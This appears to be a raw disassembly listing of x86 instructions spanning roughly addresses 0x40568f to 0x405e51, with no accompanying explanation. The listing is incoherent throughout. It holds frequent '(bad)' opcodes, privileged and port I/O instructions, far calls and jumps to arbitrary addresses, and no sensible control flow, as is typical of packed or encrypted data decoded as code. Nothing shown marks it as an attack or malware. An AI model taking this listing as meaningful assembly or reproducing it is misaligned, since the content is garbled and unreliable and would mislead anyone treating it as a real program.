  40568f:	xchg   edi,eax
  405690:	mov    ebp,DWORD PTR [esp+eax*8]
  405693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405694:	sub    esp,0x9445a664
  40569a:	dec    esi
  40569b:	and    dl,BYTE PTR fs:[eax]
  40569e:	lahf   
  40569f:	loope  0x40565d
  4056a1:	bnd jb 0x405693
  4056a4:	lods   eax,DWORD PTR ds:[esi]
  4056a5:	nop
  4056a6:	sub    bl,BYTE PTR [edx-0x58]
  4056a9:	lea    esp,gs:[ebx-0x30]
  4056ad:	cs mov ebp,0xa50e2a54
  4056b3:	call   0x53f:0xbf77ed6e
  4056ba:	test   eax,0x46ac775b
  4056bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056c0:	pop    edi
  4056c1:	jg     0x405682
  4056c3:	or     BYTE PTR ds:0x5c2aeed7,bh
  4056c9:	lahf   
  4056ca:	aam    0xd2
  4056cc:	pop    ds
  4056cd:	dec    edi
  4056ce:	mov    eax,ds:0xbfbb9f24
  4056d3:	push   0xf6539ec9
  4056d8:	arpl   WORD PTR [eax+edi*4-0xc],si
  4056dc:	xchg   cl,bl
  4056de:	fist   DWORD PTR [edx+ebp*2]
  4056e1:	or     esp,DWORD PTR [edx]
  4056e3:	not    dh
  4056e5:	sbb    ebp,esp
  4056e7:	dec    ecx
  4056e8:	jp     0x405743
  4056ea:	cwde   
  4056eb:	jo     0x40568a
  4056ed:	jl     0x40573f
  4056ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056f0:	jp     0x4056bf
  4056f2:	push   ecx
  4056f3:	xchg   edi,eax
  4056f4:	jbe    0x40570a
  4056f6:	xchg   edi,eax
  4056f7:	(bad)  
  4056f8:	push   cs
  4056f9:	cmp    BYTE PTR [esi+ecx*1],0x1c
  4056fd:	(bad)  
  4056fe:	bound  edi,QWORD PTR [ebp-0x55]
  405701:	popf   
  405702:	xor    al,0x10
  405704:	pop    es
  405705:	loop   0x40570b
  405707:	rol    BYTE PTR [eax-0x2d9985d5],cl
  40570d:	adc    DWORD PTR [eax-0x4b9bd4a5],esi
  405713:	push   0xffffff80
  405715:	and    BYTE PTR [esi+0x43],bh
  405718:	mov    ebp,0xeb7974a2
  40571d:	dec    ecx
  40571e:	out    dx,eax
  40571f:	xchg   ebx,eax
  405720:	int    0xd8
  405722:	inc    ecx
  405723:	clc    
  405724:	and    cl,BYTE PTR ds:0xbe1d7220
  40572a:	add    BYTE PTR [ebx+0x1d],al
  40572d:	pop    edi
  40572e:	xor    dl,BYTE PTR [esi]
  405730:	repz pop ebp
  405732:	push   esp
  405733:	sub    BYTE PTR [edx],cl
  405735:	mov    ecx,0x84ceeec1
  40573a:	imul   eax,esp,0x79
  40573d:	mov    ah,0x9a
  40573f:	cld    
  405740:	mov    si,0xc7c0
  405744:	add    eax,0xe0e9c819
  405749:	mov    edx,ecx
  40574b:	mov    ebx,0x422212ca
  405750:	and    DWORD PTR [ebx],ebx
  405752:	cmp    al,0x7e
  405754:	outs   dx,DWORD PTR ds:[esi]
  405755:	sub    dh,bh
  405757:	scas   al,BYTE PTR es:[edi]
  405758:	dec    ebp
  405759:	imul   esp,eax,0x6cdd8c36
  40575f:	jl     0x40573c
  405761:	xchg   DWORD PTR [esi-0x7815926b],ebp
  405767:	pop    edi
  405768:	cwde   
  405769:	sbb    DWORD PTR [eax+esi*4+0x2f],esi
  40576d:	xchg   ebp,eax
  40576e:	in     eax,dx
  40576f:	xchg   edi,eax
  405770:	inc    ebx
  405771:	out    dx,ax
  405773:	pop    ecx
  405774:	retf   0xcc22
  405777:	xchg   ecx,eax
  405778:	clc    
  405779:	rcl    DWORD PTR [ebp-0x27],cl
  40577c:	(bad)  
  40577d:	add    eax,0x30a5f9ee
  405782:	xchg   edx,eax
  405783:	out    dx,eax
  405784:	dec    edx
  405785:	sub    BYTE PTR [esi-0x3c717901],cl
  40578b:	in     al,dx
  40578c:	push   0xffffff85
  40578e:	dec    ecx
  40578f:	xchg   esi,eax
  405790:	mov    ecx,DWORD PTR [ebp+0x5f]
  405793:	cmp    al,0xf7
  405795:	test   BYTE PTR [eax-0x4f1078e7],dh
  40579b:	push   es
  40579c:	push   eax
  40579d:	daa    
  40579e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40579f:	(bad)  
  4057a0:	jmp    0x1f229185
  4057a5:	outs   dx,DWORD PTR ds:[esi]
  4057a6:	mov    ah,0x5e
  4057a8:	sub    DWORD PTR [edi-0xa],edx
  4057ab:	cmp    eax,0x373c8abc
  4057b0:	mov    al,ds:0x1f6a64c7
  4057b5:	ror    BYTE PTR [ebp-0x159ab695],1
  4057bb:	in     al,0x7a
  4057bd:	hlt    
  4057be:	push   0xffffff9f
  4057c0:	(bad)  
  4057c1:	daa    
  4057c2:	and    DWORD PTR [edx],esi
  4057c4:	pop    es
  4057c5:	xor    cl,BYTE PTR [ebx]
  4057c7:	and    BYTE PTR [ebx],0x98
  4057ca:	(bad)  
  4057cb:	mov    bh,0x57
  4057cd:	inc    eax
  4057ce:	mov    esp,0x9fab2c89
  4057d3:	dec    esi
  4057d4:	out    dx,eax
  4057d5:	cmp    esp,DWORD PTR [edi]
  4057d7:	jp     0x4057d5
  4057d9:	aas    
  4057da:	not    DWORD PTR [esi-0x20c4706d]
  4057e0:	push   0x76
  4057e2:	adc    ebp,esi
  4057e4:	data16 lahf 
  4057e6:	pop    esp
  4057e7:	in     al,0x98
  4057e9:	jl     0x4057d6
  4057eb:	xchg   esi,ebp
  4057ed:	jge    0x4057f3
  4057ef:	call   0x2b5f:0x80401783
  4057f6:	popf   
  4057f7:	cmp    dh,dl
  4057f9:	xor    eax,ebx
  4057fb:	xor    edx,DWORD PTR [ebx+0x235d40ee]
  405801:	adc    al,0x8e
  405803:	int3   
  405804:	xchg   edi,eax
  405805:	jne    0x4057e1
  405807:	imul   edi,DWORD PTR [esi+0x20969a14],0xffffffd1
  40580e:	dec    ebx
  40580f:	lahf   
  405810:	add    DWORD PTR [esi-0xf],ebp
  405813:	in     al,0xaf
  405815:	test   DWORD PTR [eax-0x1b52c212],esi
  40581b:	mov    dl,BYTE PTR [edx+ebx*1+0x5cdbeab0]
  405822:	jo     0x405823
  405824:	sti    
  405825:	mov    al,0x90
  405827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405828:	call   0xb7e86a69
  40582d:	ja     0x405800
  40582f:	mov    eax,ds:0xbdf19bbd
  405834:	push   ds
  405835:	push   ss
  405836:	inc    edi
  405837:	das    
  405838:	fiadd  WORD PTR ds:0x39c088c6
  40583e:	mov    ecx,0x33f6b11a
  405843:	dec    edx
  405844:	int3   
  405845:	xor    DWORD PTR [edi+edi*1-0x322a4369],ebx
  40584c:	neg    BYTE PTR [ecx+0x2b]
  40584f:	mov    al,ds:0x7156593d
  405854:	push   0xffffffc0
  405856:	mov    esp,0x8ccb06b9
  40585b:	jno    0x40584b
  40585d:	fdiv   QWORD PTR [esi]
  40585f:	sbb    bl,cl
  405861:	mov    esi,0x48a649b8
  405866:	dec    edi
  405867:	cmp    ecx,edx
  405869:	inc    esi
  40586a:	cmp    eax,0xbd78a01b
  40586f:	popa   
  405870:	push   0x42
  405872:	push   es
  405873:	les    edx,FWORD PTR [ebx]
  405875:	adc    BYTE PTR [edx+0xb],dh
  405878:	dec    esp
  405879:	loope  0x4058ef
  40587b:	jmp    0x1867:0x9cdcd0ed
  405882:	gs sub cl,bh
  405885:	rcr    BYTE PTR [ebx-0x70],0x62
  405889:	mov    DWORD PTR [edi],esi
  40588b:	ins    DWORD PTR es:[edi],dx
  40588c:	xlat   BYTE PTR ds:[ebx]
  40588d:	push   edi
  40588e:	mov    ah,0x70
  405890:	mov    al,0xee
  405892:	lahf   
  405893:	(bad)  
  405894:	cli    
  405895:	out    0x8d,al
  405897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405898:	cwde   
  405899:	in     eax,dx
  40589a:	mov    bh,0x45
  40589c:	and    eax,0x8581b6b0
  4058a1:	popf   
  4058a2:	inc    eax
  4058a3:	icebp  
  4058a4:	inc    ebx
  4058a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058a6:	mov    esi,0x5cf8b7eb
  4058ab:	inc    esi
  4058ac:	and    eax,0x12ac9b62
  4058b1:	jne    0x4058d1
  4058b3:	jg     0x40584d
  4058b5:	xchg   ecx,eax
  4058b6:	mov    dl,BYTE PTR [ebp-0x5461f4f5]
  4058bc:	loopne 0x405892
  4058be:	mov    dl,0x1c
  4058c0:	inc    esi
  4058c1:	inc    edi
  4058c2:	icebp  
  4058c3:	imul   esp,DWORD PTR [ebx-0xab3e82d],0x3469af7b
  4058cd:	add    esi,DWORD PTR [ebx+0x4]
  4058d0:	fldcw  WORD PTR [edx+ebx*4-0x39]
  4058d4:	add    esi,ecx
  4058d6:	in     al,0x21
  4058d8:	leave  
  4058d9:	sbb    bh,BYTE PTR [ecx+ecx*2+0x4c54098b]
  4058e0:	int    0xae
  4058e2:	add    ah,BYTE PTR [edx]
  4058e4:	pushf  
  4058e5:	pusha  
  4058e6:	adc    eax,0x259a0ec
  4058eb:	stos   BYTE PTR es:[edi],al
  4058ec:	jmp    0x8179:0xb7a13691
  4058f3:	xchg   ebp,eax
  4058f4:	fs leave 
  4058f6:	fistp  QWORD PTR [edi+0x19]
  4058f9:	mov    ebx,0x40fa9aa7
  4058fe:	aam    0x3a
  405900:	shr    BYTE PTR [ecx-0x15],1
  405903:	mov    DWORD PTR [ebx+0x54],0x8c5212a4
  40590a:	fiadd  DWORD PTR [edi-0xdc2ed60]
  405910:	aam    0x80
  405912:	jae    0x405939
  405914:	mov    al,ds:0x8ab0f541
  405919:	sbb    eax,0x1adb1774
  40591e:	xchg   esi,eax
  40591f:	adc    BYTE PTR [esi+0x36bee5ce],bh
  405925:	push   0x1b
  405927:	sar    DWORD PTR [esi-0x12606dc7],0x44
  40592e:	sub    DWORD PTR [eax+0x47d65405],ebx
  405934:	ret    0x2ef9
  405937:	inc    eax
  405938:	mov    dl,0xfa
  40593a:	mov    dh,0xf8
  40593c:	dec    ch
  40593e:	cli    
  40593f:	push   ss
  405940:	or     eax,0x245c473d
  405945:	fisub  DWORD PTR [ebx+0x1de89b0e]
  40594b:	sahf   
  40594c:	out    0xe5,eax
  40594e:	jmp    0x405961
  405950:	cwde   
  405951:	data16 je 0x4059ae
  405954:	mov    edi,0xddadff5b
  405959:	retf   
  40595a:	rcl    DWORD PTR [eax-0x7f89ac26],1
  405960:	sbb    edi,DWORD PTR [eax]
  405962:	lods   eax,DWORD PTR ds:[esi]
  405963:	xchg   esi,eax
  405964:	not    DWORD PTR [ebp-0x1c]
  405967:	add    ebx,DWORD PTR [esi-0x192efcf1]
  40596d:	jmp    0x39b9a7f7
  405972:	fistp  DWORD PTR [edx-0x77972f32]
  405978:	clc    
  405979:	jnp    0x405910
  40597b:	xchg   esp,eax
  40597c:	sub    eax,0x81d8b6b4
  405981:	xlat   BYTE PTR ds:[ebx]
  405982:	jg     0x40597f
  405984:	sub    eax,esp
  405986:	adc    BYTE PTR [esi],0xf1
  405989:	addr16 push esp
  40598b:	sub    eax,0x104ec935
  405990:	jge    0x405948
  405992:	int3   
  405993:	test   BYTE PTR [ebx],cl
  405995:	loopne 0x4059ac
  405997:	mov    al,ah
  405999:	pop    es
  40599a:	fwait
  40599b:	ins    BYTE PTR es:[edi],dx
  40599c:	pop    edi
  40599d:	icebp  
  40599e:	in     eax,0x55
  4059a0:	sbb    al,0x3b
  4059a2:	call   esp
  4059a4:	mov    ch,0xbf
  4059a6:	ror    BYTE PTR [ebx+0x7da897b0],1
  4059ac:	data16 stc 
  4059ae:	je     0x4059f8
  4059b0:	cmp    DWORD PTR [edx-0x24ca33f8],ebx
  4059b6:	test   BYTE PTR [edx],0xba
  4059b9:	push   esp
  4059ba:	sbb    edi,DWORD PTR [eax]
  4059bc:	or     eax,0x3ff9b028
  4059c1:	pop    ebx
  4059c2:	dec    edi
  4059c3:	fsub   QWORD PTR [edi-0x2d]
  4059c6:	out    dx,eax
  4059c7:	mov    esp,0x78897b00
  4059cc:	inc    esp
  4059cd:	xlat   BYTE PTR ds:[ebx]
  4059ce:	jns    0x40599b
  4059d0:	xchg   esp,eax
  4059d1:	sub    ecx,DWORD PTR [ebp-0x36e1637c]
  4059d7:	mov    dl,0xe1
  4059d9:	push   ecx
  4059da:	sbb    al,0x18
  4059dc:	push   esp
  4059dd:	outs   dx,DWORD PTR es:[esi]
  4059df:	inc    ecx
  4059e0:	ja     0x4059e5
  4059e2:	mov    eax,0x3e484fea
  4059e7:	dec    ecx
  4059e8:	clc    
  4059e9:	mov    ch,0xf3
  4059eb:	or     eax,ecx
  4059ed:	cmp    al,bl
  4059ef:	pop    edx
  4059f0:	mov    ds:0x8456d8bb,al
  4059f5:	push   cs
  4059f6:	inc    ebp
  4059f7:	jge    0x40597d
  4059f9:	cs dec edx
  4059fb:	arpl   WORD PTR gs:[ecx+0x1f03bce9],di
  405a02:	mov    edx,DWORD PTR [edx]
  405a04:	fcomip st,st(6)
  405a06:	jg     0x4059d5
  405a08:	(bad)  
  405a09:	xlat   BYTE PTR ds:[ebx]
  405a0a:	xlat   BYTE PTR ds:[ebx]
  405a0b:	dec    ecx
  405a0c:	inc    edi
  405a0d:	addr16 loopne 0x405a6e
  405a10:	(bad)  
  405a11:	arpl   ax,cx
  405a13:	jmp    0x40599e
  405a15:	jl     0x4059ce
  405a17:	mov    esi,ebx
  405a19:	add    BYTE PTR [eax+0x2a],dl
  405a1c:	inc    edi
  405a1d:	in     eax,0xb6
  405a1f:	inc    edi
  405a20:	pop    edi
  405a21:	retf   
  405a22:	imul   esp,ebp,0xa8e4b7c9
  405a28:	scas   eax,DWORD PTR es:[edi]
  405a29:	jb     0x405a20
  405a2b:	adc    al,0xfd
  405a2d:	outs   dx,WORD PTR ds:[esi]
  405a2f:	adc    ebx,ebx
  405a31:	push   0xffffffef
  405a33:	inc    esp
  405a34:	inc    esi
  405a35:	sti    
  405a36:	or     eax,eax
  405a38:	icebp  
  405a39:	js     0x405a37
  405a3b:	mov    cl,BYTE PTR [esi]
  405a3d:	shl    BYTE PTR [edi],0x8f
  405a40:	jmp    0x4a90dc65
  405a45:	push   eax
  405a46:	fucom  st(6)
  405a48:	fnclex 
  405a4a:	aaa    
  405a4b:	test   al,0x3d
  405a4d:	sbb    BYTE PTR [eax+esi*8+0x41],bh
  405a51:	sahf   
  405a52:	shl    esi,0x86
  405a55:	push   ss
  405a56:	xor    eax,0xd67c9575
  405a5b:	dec    ebx
  405a5c:	fsubr  QWORD PTR [ebx-0x76]
  405a5f:	jae    0x405a0d
  405a61:	into   
  405a62:	test   al,0xf1
  405a64:	ret    
  405a65:	in     eax,dx
  405a66:	dec    ecx
  405a67:	(bad)  
  405a68:	sbb    al,0x29
  405a6a:	xor    bh,BYTE PTR [edi]
  405a6c:	int3   
  405a6d:	aas    
  405a6e:	and    BYTE PTR [ecx],bl
  405a70:	test   DWORD PTR [edx-0x35a33a19],ecx
  405a76:	xchg   ebx,eax
  405a77:	in     eax,dx
  405a78:	mov    WORD PTR [ebp+0x67c9ebcd],ds
  405a7e:	mov    esp,es
  405a80:	sbb    BYTE PTR [ecx+0x4849b65e],ah
  405a86:	shl    DWORD PTR [eax-0x60a1d812],1
  405a8c:	scas   eax,DWORD PTR es:[edi]
  405a8d:	out    0x1c,eax
  405a8f:	jmp    0x4a3:0x24790322
  405a96:	ret    0x8aaa
  405a99:	pop    eax
  405a9a:	popa   
  405a9b:	sub    dh,bl
  405a9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a9e:	rol    ah,1
  405aa0:	out    dx,eax
  405aa1:	sub    BYTE PTR [edx-0x45],0x7b
  405aa5:	pushf  
  405aa6:	push   ss
  405aa7:	arpl   si,bp
  405aa9:	aaa    
  405aaa:	dec    esp
  405aab:	rol    cl,cl
  405aad:	sar    DWORD PTR [esi+ebx*8],0x78
  405ab1:	popf   
  405ab2:	and    al,0x5f
  405ab4:	shl    BYTE PTR [edx+0x7170b6d5],0x1f
  405abb:	loope  0x405b15
  405abd:	add    DWORD PTR [edx-0x24],esi
  405ac0:	int    0xbb
  405ac2:	and    al,0xc8
  405ac4:	hlt    
  405ac5:	loope  0x405b41
  405ac7:	repz clc 
  405ac9:	ins    BYTE PTR es:[edi],dx
  405aca:	adc    esp,DWORD PTR [esi]
  405acc:	mov    eax,0xaf278a5a
  405ad1:	pop    ecx
  405ad2:	jl     0x405a7b
  405ad4:	mov    bl,0x4a
  405ad6:	cdq    
  405ad7:	add    DWORD PTR [esi+0x34],0x316b8f5a
  405ade:	jmp    0x83437465
  405ae3:	adc    DWORD PTR [esi+0x41],ebp
  405ae6:	mov    bh,0xcf
  405ae8:	mov    ds:0xe20825e9,eax
  405aed:	lods   al,BYTE PTR ds:[esi]
  405aee:	imul   eax,esp,0x4b
  405af1:	packsswb mm2,mm6
  405af4:	and    BYTE PTR [edx],dl
  405af6:	iret   
  405af7:	xor    DWORD PTR [ecx+0x0],eax
  405afa:	(bad)  
  405afc:	das    
  405afd:	and    DWORD PTR [esi],esi
  405aff:	mov    DWORD PTR [ebx+0x546103ba],eax
  405b05:	ss ret 0x93fd
  405b09:	outs   dx,BYTE PTR ds:[esi]
  405b0a:	sbb    dl,BYTE PTR [esi-0x586e2db2]
  405b10:	or     bh,BYTE PTR [esi+0x662aadf5]
  405b16:	repz call DWORD PTR [esi-0x3e]
  405b1a:	mov    ecx,0x3517954d
  405b1f:	jnp    0x405afd
  405b21:	add    al,0x49
  405b23:	dec    ecx
  405b24:	into   
  405b25:	adc    esp,DWORD PTR [esi+ecx*1-0x62ff37b8]
  405b2c:	xchg   ecx,eax
  405b2d:	jb     0x405b3c
  405b2f:	sahf   
  405b30:	int    0xcc
  405b32:	jns    0x405b03
  405b34:	test   eax,0xacf34f9a
  405b39:	inc    ah
  405b3b:	push   eax
  405b3c:	mov    cl,0x86
  405b3e:	dec    ebx
  405b3f:	arpl   si,bx
  405b41:	addr16 (bad) 
  405b43:	mov    al,ds:0x5ba3ef7
  405b48:	mov    dl,0x91
  405b4a:	or     edi,DWORD PTR [ecx-0x7d37cfd2]
  405b50:	data16 mov ah,0x86
  405b53:	leave  
  405b54:	sbb    bl,BYTE PTR [ebx]
  405b56:	or     ebx,esi
  405b58:	ror    ebx,0xbc
  405b5b:	sub    eax,0x24202360
  405b60:	adc    eax,0x96363bc0
  405b65:	fisttp WORD PTR [edx+0x7f9a2a99]
  405b6b:	mov    dl,0x19
  405b6d:	xchg   ch,bl
  405b6f:	(bad)  
  405b70:	dec    edi
  405b71:	imul   ecx,DWORD PTR [edi-0x59],0x55b28421
  405b78:	xchg   ebp,eax
  405b79:	fbld   TBYTE PTR [esi+0x1354ac58]
  405b7f:	repz dec ecx
  405b81:	add    edi,esp
  405b83:	and    DWORD PTR [edx-0x3ccacd2c],ebx
  405b89:	js     0x405bfc
  405b8b:	mov    ebx,0x21e7d801
  405b90:	js     0x405b59
  405b92:	add    al,0x71
  405b94:	or     al,0xd8
  405b96:	mov    edx,0xa9099b71
  405b9b:	jp     0x405bfb
  405b9d:	or     al,0x42
  405b9f:	inc    esi
  405ba0:	out    0xfa,al
  405ba2:	mov    eax,ds:0xaf70747a
  405ba7:	push   esi
  405ba8:	arpl   ax,ax
  405baa:	into   
  405bab:	fxch   st(2)
  405bad:	outs   dx,DWORD PTR ds:[esi]
  405bae:	inc    BYTE PTR [ebp+0x1d]
  405bb1:	push   es
  405bb2:	in     eax,0x90
  405bb4:	cmp    al,ch
  405bb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bb7:	cmp    eax,0x450824fd
  405bbc:	jno    0x405c02
  405bbe:	mov    al,ds:0x5551a447
  405bc3:	jmp    0x405c2a
  405bc5:	pop    ds
  405bc6:	jle    0x405b89
  405bc8:	dec    esp
  405bc9:	and    al,BYTE PTR [ebp-0x34]
  405bcc:	outs   dx,BYTE PTR ds:[esi]
  405bcd:	push   ss
  405bce:	add    eax,0x5b25ac2b
  405bd3:	mov    eax,ds:0xd91603c8
  405bd8:	daa    
  405bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bda:	mov    ds:0xa1aac79f,eax
  405bdf:	mov    eax,0xd2919f29
  405be4:	cli    
  405be5:	out    0xdd,eax
  405be7:	mov    al,0x92
  405be9:	pop    ds
  405bea:	adc    bh,dl
  405bec:	adc    DWORD PTR [eax-0x4e4cb48f],ebx
  405bf2:	cmp    DWORD PTR [edi+0x4aeb7459],ecx
  405bf8:	lods   eax,DWORD PTR ds:[esi]
  405bf9:	punpckhbw mm7,QWORD PTR [eax+eax*4+0x746e48b8]
  405c01:	daa    
  405c02:	stos   BYTE PTR es:[edi],al
  405c03:	push   ss
  405c04:	cmp    eax,0xae61579d
  405c09:	xchg   edx,eax
  405c0a:	imul   eax,DWORD PTR [edi],0xffffff8f
  405c0d:	fisttp QWORD PTR [eax]
  405c0f:	adc    BYTE PTR [ebx+edx*2-0x7a],0x54
  405c14:	dec    ebp
  405c15:	pop    ebx
  405c16:	mov    ebx,0xd17201d3
  405c1b:	arpl   dx,sp
  405c1d:	hlt    
  405c1e:	inc    edx
  405c1f:	jp     0x405c01
  405c21:	icebp  
  405c22:	cwde   
  405c23:	ror    DWORD PTR [eax-0x1e9211da],0x46
  405c2a:	and    eax,0x4e611b03
  405c2f:	xchg   esi,eax
  405c30:	mov    edx,DWORD PTR [edi+edi*8+0x5]
  405c34:	pop    edx
  405c35:	adc    esp,DWORD PTR [ebp-0x76a72cbd]
  405c3b:	rol    DWORD PTR [ebx],0x8b
  405c3e:	push   esi
  405c3f:	push   DWORD PTR [edi+0x3c]
  405c42:	jmp    0x829bbc21
  405c47:	cdq    
  405c48:	add    BYTE PTR [esi-0x4e07b3dc],0x68
  405c4f:	fs js  0x405c0a
  405c52:	push   cs
  405c53:	inc    esp
  405c54:	add    al,0x3d
  405c56:	add    edx,0xffffffe1
  405c59:	(bad)
  405c5e:	mov    bl,0x91
  405c60:	mov    ds:0x760a1fbc,eax
  405c65:	stos   DWORD PTR es:[edi],eax
  405c66:	pushf  
  405c67:	pusha  
  405c68:	dec    edx
  405c69:	call   0x28cc:0x32d6f8de
  405c70:	mov    cl,0x8c
  405c72:	dec    edi
  405c73:	pop    eax
  405c74:	cmc    
  405c75:	mov    BYTE PTR [eax+eiz*1],cl
  405c78:	cmp    BYTE PTR [edx],al
  405c7a:	xchg   esp,eax
  405c7b:	imul   ebp,DWORD PTR [edi+0x5c64b2bc],0x7e8ccd06
  405c85:	leave  
  405c86:	jae    0x405c3c
  405c88:	lahf   
  405c89:	and    ah,dh
  405c8b:	out    0xfe,al
  405c8d:	mov    ch,0x6e
  405c8f:	push   ss
  405c90:	int    0x37
  405c92:	outs   dx,DWORD PTR ds:[esi]
  405c93:	(bad)  [edx+eax*4-0x59]
  405c97:	aas    
  405c98:	repz xchg ebp,eax
  405c9a:	cmp    eax,0xa2b41081
  405c9f:	jb     0x405c5b
  405ca1:	sbb    al,0xa6
  405ca3:	out    0x72,al
  405ca5:	das    
  405ca6:	xchg   DWORD PTR [esi-0x1d],edx
  405ca9:	fidivr DWORD PTR [ecx]
  405cab:	cmp    BYTE PTR [ebx+0x50485406],bl
  405cb1:	icebp  
  405cb2:	sti    
  405cb3:	and    DWORD PTR [esi],esi
  405cb5:	in     al,0x8b
  405cb7:	loopne 0x405c7e
  405cb9:	int3   
  405cba:	xchg   BYTE PTR [ecx+0x42],dl
  405cbd:	pop    edx
  405cbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cbf:	inc    ebp
  405cc0:	push   0x8d462af3
  405cc5:	out    dx,eax
  405cc6:	jmp    0x9fd07d6f
  405ccb:	rol    BYTE PTR [ebx],1
  405ccd:	pushf  
  405cce:	(bad)  
  405ccf:	push   ebx
  405cd0:	xor    eax,DWORD PTR [eax]
  405cd2:	arpl   WORD PTR [edi-0x26],dx
  405cd5:	fcmovnbe st,st(2)
  405cd7:	and    BYTE PTR ds:0x4ceef777,ch
  405cdd:	jecxz  0x405d43
  405cdf:	ret    
  405ce0:	and    BYTE PTR ds:0x56984fca,bl
  405ce6:	push   cs
  405ce7:	pop    edx
  405ce8:	push   esi
  405ce9:	mov    esi,0x854d1159
  405cee:	fst    DWORD PTR [esi]
  405cf0:	stos   BYTE PTR es:[edi],al
  405cf1:	inc    eax
  405cf2:	jbe    0x405d5f
  405cf4:	sub    al,0xd1
  405cf7:	cmp    eax,0xaa516ad6
  405cfc:	sbb    eax,0xaa6fb0dc
  405d01:	ret    
  405d02:	pop    eax
  405d03:	xchg   dh,dl
  405d05:	sahf   
  405d06:	add    ebp,DWORD PTR [edi]
  405d08:	ins    DWORD PTR es:[edi],dx
  405d09:	add    eax,0xaa398cdf
  405d0e:	mov    al,0x8b
  405d10:	add    DWORD PTR [esi],0xb14218f6
  405d16:	push   ebp
  405d17:	inc    eax
  405d18:	in     eax,0x32
  405d1a:	add    BYTE PTR es:[edi-0x67],dl
  405d1e:	sahf   
  405d1f:	mov    edi,0xb7016a08
  405d24:	cmp    dl,BYTE PTR [eax-0x6c]
  405d27:	iret   
  405d28:	push   ss
  405d29:	adc    edx,DWORD PTR [ebx]
  405d2b:	mov    DWORD PTR [edx+0x550963f4],ebp
  405d31:	loop   0x405ce4
  405d33:	stos   DWORD PTR es:[edi],eax
  405d34:	sbb    al,0x92
  405d36:	test   eax,0xf2bea68b
  405d3b:	jmp    0x405d7d
  405d3d:	mov    edx,0x5653d2e0
  405d42:	cwde   
  405d43:	and    edx,DWORD PTR [ebp-0x80]
  405d46:	pop    ebx
  405d47:	mov    bl,0x8f
  405d49:	cmp    DWORD PTR [esi-0x65392650],edi
  405d4f:	sbb    DWORD PTR [ebp-0x20],edx
  405d52:	and    DWORD PTR [edx-0x74660ebe],edi
  405d58:	adc    esp,DWORD PTR ds:[ebx+0x59]
  405d5c:	jae    0x405d80
  405d5e:	jmp    0x9337:0x275af322
  405d65:	mov    BYTE PTR [eax],ah
  405d67:	sub    bh,BYTE PTR [ebx]
  405d69:	or     cl,dh
  405d6b:	xor    al,0x9
  405d6e:	fldenv [ecx]
  405d70:	sub    al,0xdf
  405d72:	imul   edi,ecx,0x4fadc82e
  405d78:	lahf   
  405d79:	pop    ss
  405d7a:	jl     0x405d14
  405d7c:	repz dec esp
  405d7e:	addr16 enter 0xac26,0x68
  405d83:	test   DWORD PTR [eax],edi
  405d85:	mov    eax,ds:0xe3266dfe
  405d8a:	fsubp  st(6),st
  405d8c:	cmc    
  405d8d:	es icebp 
  405d8f:	jge    0x405e10
  405d91:	dec    ebx
  405d92:	pop    esp
  405d94:	ss mov ebp,0x2302a36c
  405d9a:	popa   
  405d9b:	mov    eax,ds:0x1aa79e3c
  405da0:	popf   
  405da1:	sahf   
  405da2:	jl     0x405d31
  405da4:	fwait
  405da5:	addr16 jne 0x405d4d
  405da8:	jbe    0x405d8b
  405daa:	jp     0x405dfc
  405dac:	push   edi
  405dad:	fdivrp st(2),st
  405daf:	std    
  405db0:	or     BYTE PTR [edx+0x73356ceb],bh
  405db6:	in     al,0x15
  405db8:	or     BYTE PTR [ebx+0x3b],0xa4
  405dbc:	add    al,0xce
  405dbe:	(bad)  
  405dc0:	inc    ecx
  405dc1:	push   ebp
  405dc2:	cdq    
  405dc3:	je     0x405d50
  405dc5:	sahf   
  405dc6:	dec    edx
  405dc7:	sub    ch,BYTE PTR [edi+ecx*4]
  405dca:	cs out dx,al
  405dcc:	adc    edi,DWORD PTR [esi]
  405dce:	lods   eax,DWORD PTR ds:[esi]
  405dcf:	mov    ecx,0x68eab0c3
  405dd4:	push   esi
  405dd5:	data16 jne 0x405e2e
  405dd8:	shl    BYTE PTR [esi+ecx*8],0xf
  405ddc:	and    ch,cl
  405dde:	jne    0x405d83
  405de0:	in     al,dx
  405de1:	adc    eax,0x3bf5807c
  405de6:	repz add al,BYTE PTR [ecx]
  405de9:	out    0xf3,al
  405deb:	fisttp WORD PTR [edx-0x32]
  405dee:	sbb    al,0x39
  405df0:	ds mov edx,0x7ed0d257
  405df6:	out    0x8a,eax
  405df8:	outs   dx,DWORD PTR ds:[esi]
  405df9:	inc    eax
  405dfa:	push   0xffffffa1
  405dfc:	sbb    cl,bl
  405dfe:	retf   0x1842
  405e01:	call   0x3354:0x4a2e7b2
  405e08:	pop    esi
  405e09:	clc    
  405e0a:	fisub  DWORD PTR [ecx]
  405e0c:	add    al,0xbd
  405e0e:	push   edx
  405e0f:	sbb    eax,0xd2675afc
  405e14:	loop   0x405e48
  405e16:	aad    0x6f
  405e18:	jle    0x405dbd
  405e1a:	sar    DWORD PTR [edx],1
  405e1c:	push   eax
  405e1d:	mov    al,ds:0xee3a14c
  405e22:	cwde   
  405e23:	adc    BYTE PTR [eax],ch
  405e25:	sub    dh,cl
  405e27:	xor    edi,edi
  405e29:	mov    esp,0xbaaca29f
  405e2e:	hlt    
  405e2f:	mov    al,0x83
  405e31:	outs   dx,BYTE PTR ds:[esi]
  405e32:	nop
  405e33:	shl    DWORD PTR [esi+0x7697b913],cl
  405e39:	repz sbb esp,DWORD PTR [edi]
  405e3c:	imul   eax,DWORD PTR [eax],0xc60b32f
  405e42:	pop    esi
  405e43:	xor    DWORD PTR [ebx-0x69],ebx
  405e46:	sub    edx,esi
  405e48:	pop    edi
  405e49:	iret   
  405e4a:	sbb    BYTE PTR [ebx+0x24],dh
  405e4d:	scas   eax,DWORD PTR es:[edi]
  405e4e:	popa   
  405e4f:	test   bh,al
  405e51:	shr    BYTE PTR [eax],1
